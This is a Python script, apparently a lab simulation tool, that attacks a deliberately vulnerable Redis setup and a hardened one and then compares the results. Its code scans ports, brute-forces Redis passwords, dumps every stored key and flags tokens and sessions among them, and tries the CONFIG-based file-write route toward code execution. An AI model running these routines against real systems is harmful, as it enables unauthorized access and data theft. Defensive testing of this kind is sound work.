#!/usr/bin/env python3

import argparse
import socket
import time
import json
import redis
import requests
import sys
import os
import ssl
import hashlib
import random
import string
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning

# Suppress insecure request warnings for testing
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class RedisSecurityTester:
    def __init__(self, vulnerable_host, secure_host, verbose=False):
        self.vulnerable_host = vulnerable_host
        self.secure_host = secure_host
        self.verbose = verbose
        
        # Default ports
        self.vulnerable_port = 6379
        self.secure_port = 6380
        self.vulnerable_backend_port = 8001
        self.secure_backend_port = 8002
        
        # Default passwords - in real scenario these would be discovered through the attack
        # For simulation, using environment variables or defaults
        self.vulnerable_password = os.environ.get("DEV_VUL_REDIS_PASSWORD")
        self.secure_password = os.environ.get("DEV_SEC_REDIS_PASSWORD")
        
        # Test results
        self.vulnerable_results = {}
        self.secure_results = {}
        
        self.print_banner()
    
    def print_banner(self):
        """Print a banner for the security test"""
        banner = """
        ======================================================
                Redis Security Simulation Attack
        ======================================================
        Vulnerable Host: {}
        Secure Host: {}
        ======================================================
        """.format(self.vulnerable_host, self.secure_host)
        print(banner)
    
    def log(self, message):
        """Log messages if verbose mode is enabled"""
        if self.verbose:
            print(f"[*] {message}")
    
    def success(self, message):
        """Log success messages"""
        print(f"[+] {message}")
    
    def warning(self, message):
        """Log warning messages"""
        print(f"[!] {message}")
    
    def error(self, message):
        """Log error messages"""
        print(f"[-] {message}")
    
    def port_scan(self, host, start_port=6000, end_port=7000):
        """Scan for open ports on the target host"""
        self.log(f"Scanning ports {start_port}-{end_port} on {host}...")
        open_ports = []
        
        def check_port(port):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            if result == 0:
                return port
            return None
        
        # Use ThreadPoolExecutor for faster scanning
        with ThreadPoolExecutor(max_workers=50) as executor:
            for open_port in executor.map(check_port, range(start_port, end_port + 1)):
                if open_port:
                    open_ports.append(open_port)
                    self.success(f"Found open port: {open_port}")
        
        return open_ports
    
    def test_redis_connection(self, host, port, password=None, use_ssl=False):
        """Test direct Redis connection"""
        self.log(f"Testing Redis connection to {host}:{port} (SSL: {use_ssl})...")
        
        try:
            # Use provided password or default based on host type
            if password is None:
                password = self.vulnerable_password if host == self.vulnerable_host else self.secure_password
            
            if use_ssl:
                # For SSL connections
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                connection = redis.Redis(
                    host=host,
                    port=port,
                    password=password,
                    ssl=True,
                    ssl_cert_reqs="none",
                    decode_responses=True
                )
            else:
                # For non-SSL connections
                connection = redis.Redis(
                    host=host,
                    port=port,
                    password=password,
                    decode_responses=True
                )
            
            # Test connection
            result = connection.ping()
            self.success(f"Redis connection successful to {host}:{port}")
            return True, connection
        
        except redis.exceptions.AuthenticationError:
            self.warning(f"Redis authentication required for {host}:{port}")
            return False, "Authentication required"
        except redis.exceptions.ConnectionError as e:
            self.error(f"Redis connection failed to {host}:{port}: {str(e)}")
            return False, str(e)
        except Exception as e:
            self.error(f"Error connecting to Redis at {host}:{port}: {str(e)}")
            return False, str(e)
    
    def brute_force_password(self, host, port, use_ssl=False, wordlist=None):
        """Attempt to brute force Redis password"""
        self.log(f"Attempting to brute force Redis password on {host}:{port}...")
        
        # Default mini wordlist for demo purposes
        if not wordlist:
            wordlist = [
                "",  # No password
                "redis",
                "admin",
                "password",
                "123456",
                "foobared",  # Default Redis auth in some versions
                "123", # Known password for our demo
                "insecure_password_for_demo",
            ]
        
        for password in wordlist:
            try:
                if use_ssl:
                    connection = redis.Redis(
                        host=host,
                        port=port,
                        password=password,
                        ssl=True,
                        ssl_cert_reqs="none",
                        decode_responses=True,
                        socket_timeout=2
                    )
                else:
                    connection = redis.Redis(
                        host=host,
                        port=port,
                        password=password,
                        decode_responses=True,
                        socket_timeout=2
                    )
                
                # Test connection
                if connection.ping():
                    self.success(f"Found Redis password: '{password}'")
                    return True, password, connection
            
            except redis.exceptions.AuthenticationError:
                self.log(f"Invalid password: '{password}'")
            except redis.exceptions.ConnectionError:
                # Connection might be rate limited, sleep and continue
                time.sleep(1)
            except Exception as e:
                self.log(f"Error with password '{password}': {str(e)}")
        
        self.error("Redis password brute force failed")
        return False, None, None
    
    def dump_redis_data(self, connection):
        """Dump all data from Redis"""
        self.log("Attempting to dump Redis data...")
        
        try:
            # Get all keys
            keys = connection.keys("*")
            if not keys:
                self.warning("No keys found in Redis")
                return False, {}
            
            # Dump data for each key
            data = {}
            for key in keys:
                key_type = connection.type(key)
                
                if key_type == "string":
                    data[key] = connection.get(key)
                elif key_type == "hash":
                    data[key] = connection.hgetall(key)
                elif key_type == "list":
                    data[key] = connection.lrange(key, 0, -1)
                elif key_type == "set":
                    data[key] = list(connection.smembers(key))
                elif key_type == "zset":
                    data[key] = connection.zrange(key, 0, -1, withscores=True)
            
            self.success(f"Successfully dumped {len(keys)} keys from Redis")
            return True, data
        
        except Exception as e:
            self.error(f"Failed to dump Redis data: {str(e)}")
            return False, {}
    
    def attempt_rce(self, connection):
        """Attempt Remote Code Execution via Redis"""
        self.log("Attempting to exploit Redis for RCE...")
        
        try:
            # Check if we can run the CONFIG command (often disabled in secure Redis)
            try:
                connection.config_get("dir")
                self.warning("CONFIG command is enabled - potential RCE vulnerability")
                
                # Attempt to set the database directory to /tmp
                connection.config_set("dir", "/tmp")
                self.warning("Successfully set Redis DB dir to /tmp")
                
                # Attempt to set the database filename to a .so file
                connection.config_set("dbfilename", "redis_module.so")
                self.warning("Successfully set Redis dbfilename to redis_module.so")
                
                # Create a simple module that would execute code
                module_content = "print('RCE vulnerability confirmed')"
                connection.set("rce_test", module_content)
                
                # Save to attempt to write the file
                try:
                    connection.save()
                    self.success("Potential RCE vulnerability confirmed!")
                    return True, "Successfully exploited CONFIG command for potential RCE"
                except:
                    self.warning("Failed to save database - RCE partially mitigated")
                    return False, "Failed to save database for RCE"
            
            except redis.exceptions.ResponseError:
                self.success("CONFIG command is disabled - RCE protection in place")
                return False, "CONFIG command is disabled"
        
        except Exception as e:
            self.error(f"RCE test failed: {str(e)}")
            return False, str(e)
    
    def test_backend_api(self, host, port, is_secure=False):
        """Test the backend API for vulnerabilities"""
        self.log(f"Testing backend API at http{'s' if is_secure else ''}://{host}:{port}...")
        
        base_url = f"http{'s' if is_secure else ''}://{host}:{port}"
        results = {}
        
        # Test endpoints
        endpoints = [
            "/",
            "/health",
            "/users/1001",
            "/dump",  # Vulnerable endpoint
            "/exec",  # Vulnerable endpoint
        ]
        
        for endpoint in endpoints:
            try:
                url = f"{base_url}{endpoint}"
                headers = {}
                
                # Add API key for secure API
                if is_secure:
                    headers["X-API-Key"] = "secure_api_key_for_testing"
                
                response = requests.get(
                    url, 
                    headers=headers,
                    verify=False,  # Ignore SSL certificate verification for testing
                    timeout=5
                )
                
                status = response.status_code
                results[endpoint] = {
                    "status": status,
                    "accessible": status < 400,
                }
                
                if status < 400:
                    self.log(f"Endpoint {endpoint} is accessible (Status: {status})")
                    
                    # Check for data exposure on dump endpoint
                    if endpoint == "/dump" and status == 200:
                        try:
                            data = response.json()
                            self.warning(f"Dump endpoint exposed {len(data)} keys!")
                            results[endpoint]["data_exposed"] = True
                        except:
                            results[endpoint]["data_exposed"] = False
                else:
                    self.log(f"Endpoint {endpoint} is not accessible (Status: {status})")
            
            except requests.exceptions.RequestException as e:
                self.error(f"Error accessing {endpoint}: {str(e)}")
                results[endpoint] = {"error": str(e)}
        
        # Test command execution if available
        if "/exec" in results and results["/exec"].get("accessible", False):
            try:
                # Attempt to execute a Redis command via API
                payload = {
                    "command": "INFO",
                    "args": []
                }
                response = requests.post(
                    f"{base_url}/exec",
                    json=payload,
                    verify=False,
                    timeout=5
                )
                
                if response.status_code == 200:
                    self.warning("Command execution endpoint is accessible and working!")
                    results["/exec"]["command_execution"] = True
                else:
                    results["/exec"]["command_execution"] = False
            
            except requests.exceptions.RequestException as e:
                self.error(f"Error testing command execution: {str(e)}")
        
        return results
    
    def run_all_tests(self):
        """Run all security tests against both environments"""
        print("\n=== Starting Security Tests ===\n")
        
        # Test Vulnerable Environment
        print("\n=== Testing Vulnerable Environment ===\n")
        
        # Port scanning
        vulnerable_ports = self.port_scan(self.vulnerable_host, 6000, 9000)
        self.vulnerable_results["open_ports"] = vulnerable_ports
        
        # Find Redis ports
        for port in vulnerable_ports:
            if port == self.vulnerable_port:
                self.log(f"Found vulnerable Redis on port {port}")
            elif port == self.vulnerable_backend_port:
                self.log(f"Found vulnerable backend on port {port}")
        
        # Test Redis connection
        redis_status, redis_client = self.test_redis_connection(
            self.vulnerable_host, 
            self.vulnerable_port,
            password=self.vulnerable_password
        )
        
        # If direct connection failed, try to brute force
        if not redis_status:
            self.warning("Direct connection failed, attempting password brute force")
            success, password, redis_client = self.brute_force_password(
                self.vulnerable_host, 
                self.vulnerable_port
            )
            if success:
                self.redis_password = password
        
        # If we have a connection, try to dump data and attempt RCE
        if redis_client and not isinstance(redis_client, str):
            dump_success, dump_data = self.dump_redis_data(redis_client)
            self.vulnerable_results["data_dump"] = {
                "success": dump_success,
                "data": dump_data if dump_success else None
            }
            
            rce_success, rce_details = self.attempt_rce(redis_client)
            self.vulnerable_results["rce_attempt"] = {
                "success": rce_success,
                "details": rce_details
            }
        
        # Test backend API
        backend_results = self.test_backend_api(
            self.vulnerable_host,
            self.vulnerable_backend_port
        )
        self.vulnerable_results["backend_api"] = backend_results
        
        # Test Secure Environment
        print("\n=== Testing Secure Environment ===\n")
        
        # Port scanning
        secure_ports = self.port_scan(self.secure_host, 6000, 9000)
        self.secure_results["open_ports"] = secure_ports
        
        # Find Redis ports
        for port in secure_ports:
            if port == self.secure_port:
                self.log(f"Found secure Redis on port {port}")
            elif port == self.secure_backend_port:
                self.log(f"Found secure backend on port {port}")
        
        # Test Redis connection (with SSL)
        redis_status, redis_client = self.test_redis_connection(
            self.secure_host,
            self.secure_port,
            password=self.secure_password,
            use_ssl=True
        )
        
        # If direct connection failed, try to brute force
        if not redis_status:
            self.warning("Direct SSL connection failed, attempting password brute force")
            success, password, redis_client = self.brute_force_password(
                self.secure_host, 
                self.secure_port,
                use_ssl=True
            )
        
        # If we have a connection, try to dump data and attempt RCE
        if redis_client and not isinstance(redis_client, str):
            dump_success, dump_data = self.dump_redis_data(redis_client)
            self.secure_results["data_dump"] = {
                "success": dump_success,
                "data": dump_data if dump_success else None
            }
            
            rce_success, rce_details = self.attempt_rce(redis_client)
            self.secure_results["rce_attempt"] = {
                "success": rce_success,
                "details": rce_details
            }
        
        # Test backend API (with SSL and authentication)
        backend_results = self.test_backend_api(
            self.secure_host,
            self.secure_backend_port,
            is_secure=True
        )
        self.secure_results["backend_api"] = backend_results
        
        # Report findings
        self.report_findings()
    
    def report_findings(self):
        """Report the findings of the security tests"""
        print("\n============= SECURITY TEST REPORT =============\n")
        
        # Vulnerable Environment Report
        print("\n=== VULNERABLE ENVIRONMENT FINDINGS ===\n")
        
        print("OPEN PORTS:")
        for port in self.vulnerable_results.get("open_ports", []):
            print(f"  - Port {port} is open")
        
        print("\nDATA EXPOSURE:")
        data_dump = self.vulnerable_results.get("data_dump", {})
        if data_dump.get("success", False):
            print(f"  - Successfully extracted {len(data_dump.get('data', {}))} keys from Redis")
            # Display some of the sensitive data found
            sensitive_prefixes = ["auth_token", "api_key", "user_profile", "session", "otp"]
            for key in data_dump.get("data", {}):
                for prefix in sensitive_prefixes:
                    if key.startswith(prefix):
                        print(f"  - Found sensitive data: {key}")
                        break
        else:
            print("  - Failed to extract data from Redis")
        
        print("\nRCE VULNERABILITY:")
        rce = self.vulnerable_results.get("rce_attempt", {})
        if rce.get("success", False):
            print(f"  - RCE vulnerability confirmed: {rce.get('details', '')}")
        else:
            print(f"  - RCE vulnerability not confirmed: {rce.get('details', '')}")
        
        print("\nAPI VULNERABILITIES:")
        api = self.vulnerable_results.get("backend_api", {})
        for endpoint, details in api.items():
            status = "Accessible" if details.get("accessible", False) else "Not accessible"
            print(f"  - {endpoint}: {status}")
            if endpoint == "/dump" and details.get("data_exposed", False):
                print(f"    * Data exposure vulnerability found!")
            if endpoint == "/exec" and details.get("command_execution", False):
                print(f"    * Command execution vulnerability found!")
        
        # Secure Environment Report
        print("\n=== SECURE ENVIRONMENT FINDINGS ===\n")
        
        print("OPEN PORTS:")
        for port in self.secure_results.get("open_ports", []):
            print(f"  - Port {port} is open")
        
        print("\nDATA EXPOSURE:")
        data_dump = self.secure_results.get("data_dump", {})
        if data_dump.get("success", False):
            print(f"  - Successfully extracted {len(data_dump.get('data', {}))} keys from Redis")
            # Check if the data contains encrypted fields
            encrypted_found = False
            for key, value in data_dump.get("data", {}).items():
                if isinstance(value, dict):
                    for k, v in value.items():
                        if isinstance(v, str) and v.startswith("encrypted_"):
                            encrypted_found = True
                            print(f"  - Found encrypted data: {key} -> {k}")
                            break
                elif isinstance(value, str) and value.startswith("encrypted_"):
                    encrypted_found = True
                    print(f"  - Found encrypted data: {key}")
            
            if encrypted_found:
                print("  - Field-level encryption detected (good security practice)")
            else:
                print("  - No field-level encryption detected (security concern)")
        else:
            print("  - Failed to extract data from Redis (good security practice)")
        
        print("\nRCE VULNERABILITY:")
        rce = self.secure_results.get("rce_attempt", {})
        if rce.get("success", False):
            print(f"  - RCE vulnerability confirmed: {rce.get('details', '')}")
        else:
            print(f"  - RCE vulnerability not confirmed: {rce.get('details', '')}")
        
        print("\nAPI VULNERABILITIES:")
        api = self.secure_results.get("backend_api", {})
        for endpoint, details in api.items():
            status = "Accessible" if details.get("accessible", False) else "Not accessible"
            print(f"  - {endpoint}: {status}")
            if endpoint == "/dump" and details.get("data_exposed", False):
                print(f"    * Data exposure vulnerability found!")
            if endpoint == "/exec" and details.get("command_execution", False):
                print(f"    * Command execution vulnerability found!")
        
        print("\n============= SUMMARY =============\n")
        
        # Simplified scoring system
        vulnerable_score = 0
        secure_score = 0
        
        # Count vulnerabilities for vulnerable system (expecting them to be high)
        if self.vulnerable_results.get("data_dump", {}).get("success", False):
            vulnerable_score += 1
        if self.vulnerable_results.get("rce_attempt", {}).get("success", False):
            vulnerable_score += 1
        if self.vulnerable_results.get("backend_api", {}).get("/dump", {}).get("data_exposed", False):
            vulnerable_score += 1
        if self.vulnerable_results.get("backend_api", {}).get("/exec", {}).get("command_execution", False):
            vulnerable_score += 1
        
        # Count vulnerabilities for secure system (expecting them to be low)
        if self.secure_results.get("data_dump", {}).get("success", False):
            secure_score += 1
        if self.secure_results.get("rce_attempt", {}).get("success", False):
            secure_score += 1
        if self.secure_results.get("backend_api", {}).get("/dump", {}).get("data_exposed", False):
            secure_score += 1
        if self.secure_results.get("backend_api", {}).get("/exec", {}).get("command_execution", False):
            secure_score += 1
        
        print(f"Vulnerable Environment Vulnerabilities: {vulnerable_score}/4")
        print(f"Secure Environment Vulnerabilities: {secure_score}/4")
        
        if vulnerable_score > secure_score:
            print("\nThe security simulation shows that the secure environment successfully mitigates vulnerabilities present in the vulnerable environment.")
        else:
            print("\nWarning: The secure environment does not effectively mitigate vulnerabilities, and is actually more vulnerable than the vulnerable setup.")

def main():
    """Main function to run the security test"""
    parser = argparse.ArgumentParser(description='Redis Security Tester')
    parser.add_argument('--vulnerable-host', default='localhost', help='Vulnerable Redis host')
    parser.add_argument('--secure-host', default='localhost', help='Secure Redis host')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()
    
    # Initialize the tester
    tester = RedisSecurityTester(
        vulnerable_host=args.vulnerable_host,
        secure_host=args.secure_host,
        verbose=args.verbose
    )
    
    # Run all tests
    tester.run_all_tests()

if __name__ == "__main__":
    main()